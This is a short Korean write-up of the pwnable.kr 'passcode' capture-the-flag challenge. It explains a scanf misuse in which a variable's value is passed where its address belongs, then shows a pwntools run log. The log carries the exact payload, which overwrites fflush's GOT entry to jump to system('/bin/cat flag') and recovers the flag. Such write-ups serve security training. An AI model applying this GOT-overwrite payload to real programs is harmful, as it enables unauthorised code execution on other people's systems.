# passcode exploit 

## vul
취약점은 `scanf("%d", passcode1);`에서 발생한다. C언어의 `scanf()` 함수는 입력받을 문자열의 포맷과 문자열을 저장할 주소값을 인수로 받는다.

개발자는 문자열을 입력받아 변수 `passcode`에 저장하고 싶었을 것이다. 그러나 변수 `passcode`가 위치한 주소인 `&passcode`가 아니라 그냥 변수 `passcode`를 전달해 버려서 결국엔 `passcode`의 값 위치에 있는 엉뚱한 곳에 문자열이 저장되게 된다.

## run
```
 junhoyeo@Macbookui-MacBook-Pro  ~/Documents/pwnable.kr/5. passcode   master ●  python2 exploit.py2
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Downloading './passcode' to 'passcode': Found '/home/passcode/passcode' in ssh cache
[+] Downloading './passcode.c' to 'passcode.c': Found '/home/passcode/passcode.c' in ssh cache
[*] '/Users/junhoyeo/Documents/pwnable.kr/5. passcode/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded cached gadgets for './passcode'
[*] main address : 0x8048665
[*] fflush got address(hex) : 0x804a004
[*] fflush got address(p32) : \x04\xa0\x0
[*]    0:   55                      push   ebp
       1:   89 e5                   mov    ebp,esp
       3:   83 e4 f0                and    esp,0xfffffff0
       6:   83 ec 10                sub    esp,0x10
       9:   c7 04 24 f0 87 04 08    mov    DWORD PTR [esp],0x80487f0
      10:   e8 d6 fd ff ff          call   0xfffffdeb
      15:   e8 8a ff ff ff          call   0xffffffa4
      1a:   e8 e0 fe ff ff          call   0xfffffeff
      1f:   c7 04 24 18 88 04 08    mov    DWORD PTR [esp],0x8048818
      26:   e8 c0 fd ff ff          call   0xfffffdeb
      2b:   b8 00 00 00 00          mov    eax,0x0
      30:   c9                      leave
      31:   c3                      ret
      32:   90                      nop
      33:   90                      nop
      34:   90                      nop
      35:   90                      nop
      36:   90                      nop
      37:   90                      nop
      38:   90                      nop
      39:   90                      nop
      3a:   90                      nop
      3b:   55                      push   ebp
      3c:   57                      push   edi
      3d:   56                      push   esi
      3e:   53                      push   ebx
      3f:   e8 69 00 00 00          call   0xad
      44:   81 c3 4b 19 00 00       add    ebx,0x194b
      4a:   83 ec 1c                sub    esp,0x1c
      4d:   8b 6c 24 30             mov    ebp,DWORD PTR [esp+0x30]
      51:   8d bb 20 ff ff ff       lea    edi,[ebx-0xe0]
      57:   e8 1f fd ff ff          call   0xfffffd7b
      5c:   8d 83 20 ff ff ff       lea    eax,[ebx-0xe0]
      62:   29 c7                   sub    edi,eax
[*] 'system("/bin/cat flag")' address(hex) : 0x80486b2
[*] 'system("/bin/cat flag")' address(int) : 134514354
[+] Opening new channel: '(python -c \'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x04\xa0\x04\x08134514147"\') | ./passcode': Done
Toddler's Secure Login System 1.0 beta.

enter you name : Welcome \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x04\xa0\x0!

Sorry mom.. I got confused about scanf usage :(

enter passcode1 : Now I can safely trust you that you have credential :)

[*] FLAG : Sorry mom.. I got confused about scanf usage :(
[*] Closed SSH channel with pwnable.kr
```
